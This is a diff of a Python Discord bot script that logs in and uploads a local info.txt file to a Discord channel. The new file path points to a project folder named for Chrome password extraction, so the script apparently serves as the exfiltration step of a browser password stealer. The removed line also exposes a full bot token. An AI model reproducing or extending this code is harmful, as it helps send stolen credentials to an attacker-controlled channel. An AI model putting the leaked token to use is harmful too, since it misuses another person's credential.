@@ -1,6 +1,6 @@
 import discord
 
-TOKEN = 'MTIwNjg4OTgzMTk4OTUxMDIxNQ.GmYgry.fHzlPDU5h3DMpDqfZg8A5p5X3pb6mbugjf00cY'
+TOKEN = ''
 CHANNEL_ID = 1206955833410330635  #
 intents = discord.Intents.default()
 intents.messages = True
@@ -11,7 +11,7 @@ client = discord.Client(intents=intents)
 @client.event
 async def on_ready():
     print(f'We have logged in as {client.user}')
-    await Upload("E:\Codeing\Python Language\Projects\Project_17\info.txt")
+    await Upload("E:\Codeing\Python Language\Projects\Project_17_Chrome_Password_Extraction\Project Implement Files\info.txt")
     await client.close()
 
 async def Upload(file_path):
